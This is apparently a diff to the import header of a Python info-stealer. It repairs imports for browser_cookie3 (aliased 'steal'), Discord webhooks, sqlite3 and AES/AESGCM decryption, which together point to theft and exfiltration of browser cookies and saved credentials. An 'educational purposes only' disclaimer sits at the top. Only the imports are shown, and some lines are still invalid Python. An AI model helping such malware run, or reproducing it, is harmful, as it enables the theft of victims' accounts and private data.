@@ -1,8 +1,6 @@
 # WARN: This one is for educational purposes only! I do not recommend using it on people
 
 import psutil
-import default_backend
-import AESGCM
 import platform
 import json
 import getnode
@@ -18,8 +16,8 @@ import subprocess
 from uuid as get_mac
 import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, dhooks, os, re, sys, sqlite3
 from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
-from cryptography.hazmat.primitives.ciphers.aead
-from cryptography.hazmat.backends
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.backends import default_backend
 from Crypto.Cipher import AES
 
 
